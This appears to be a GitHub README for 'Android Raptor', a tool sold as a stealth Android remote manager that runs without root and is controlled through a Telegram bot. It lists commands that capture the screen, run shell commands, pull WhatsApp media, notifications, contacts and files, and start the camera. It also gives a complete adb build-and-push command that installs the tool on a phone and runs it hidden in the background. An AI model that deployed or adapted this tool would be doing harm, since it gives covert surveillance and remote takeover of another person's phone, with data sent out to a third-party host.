# Android Raptor
## Stealth Android Remote Manager
************ NO ROOT REQUIRED ************

![androidraptorcommands](https://user-images.githubusercontent.com/102340452/192880304-2c4f336d-69cb-4f9c-ae18-1b0c518a0552.png)


## Android Raptor Commands
		/status => ping/pong like
		/ss   	=> Capture And Download Live Screen Capture
		/soff   => Turning Screen Off
		/son    => Turning Screen On
		/sh (any valid shell command [with params]) => Execute Shell Command (ex: ls -la /sdcard/)
		/wsm => Getting All WhatsApp Media Info
		/wsi => Getting WhatsApp Images Info
		/wsis => Getting WhatsApp Images Sent Info
		/wsvs => Getting WhatsApp Videos Sent Info
		/wsv => Getting WhatsApp Videos Info
		/wss => Getting WhatsApp Statuses Info
		/wsvn => Getting WhatsApp Voice Notes Info
		/getp (full path photo) => Download Any Photo From Remote Device
		/getv (full path video) => Download Any Video From Remote Device
		/getd (full path document) => Download Any Document From Remote Device
		/url (https://anyvalidurl.com) => Open An URL In Remote Device Default Browser
		/cam => Start Camera In Remote Device
		/not => Getting All Notifications From Remote Device
		/ua => Getting All Applications Installed By The User
		/gc => Getting All Google Contacts From Remote Device 
		/wfi => Getting Wifi IP From Remote Device 
		/wfm => Getting Wifi MAC Address From Remote Device 
		/wfs => Getting Wifi SSID Name From Remote Device
		/ca => Getting Current Active Activity
		/cp => Getting Current Active Package Name
		/capp (package name) => Close App
		/isson => Know If The Screen Is On
		/sup => Send Swipe Up Gesture
		/getbl => Getting Current Battery Percentage Level
		/shutdown => Shutdown The Remote Device
		/reboot => Reboot The Remote Device    
-----------------------------------------------------------------
## Installation:

 ##### In your Android Device:
- Go to Settings
- Go to “About device” (Might be named slightly different)
- Click the “Build number” field 7 times. This will turn on “Developer options”
- Go back to Settings
- Go to “Developer options”
- Scroll down and enable “USB debugging”
- Plug the device into computer

##### On a computer run the following commands in terminal to initialize ADB:
- sudo apt install adb
- adb start-server
- git clone https://github.com/elieser9001/AndroidRaptor.git
- cd AndroidRaptor

Your device might prompt you with a trust dialog. Click accept.

##### On Telegram:
- [Create a new Telegram bot with BotFather](https://learn.microsoft.com/en-us/azure/bot-service/bot-service-channel-connect-telegram?view=azure-bot-service-4.0#create-a-new-telegram-bot-with-botfather)
- Copy and save the Telegram bot's access token for later steps.
- [Get Your Telegram User Id](https://medium.com/@tabul8tor/how-to-find-your-telegram-user-id-6878d54acafa)

## Build and Execute in Your Android Mobile Device
GOARCH=arm64 GOOS=linux go build -ldflags "-s -w" -o androidraptor main.go && adb push androidraptor /data/local/tmp/androidraptor && adb shell 'chmod 777 /data/local/tmp/androidraptor' && adb shell "nohup ./data/local/tmp/androidraptor -uid TELEGRAM_USER_ID -abk API_BOT_ACCESS_TOKEN &>/dev/null &"

- Now you can unplugg your mobile device and control it from anywhere through the bot in Telegram.
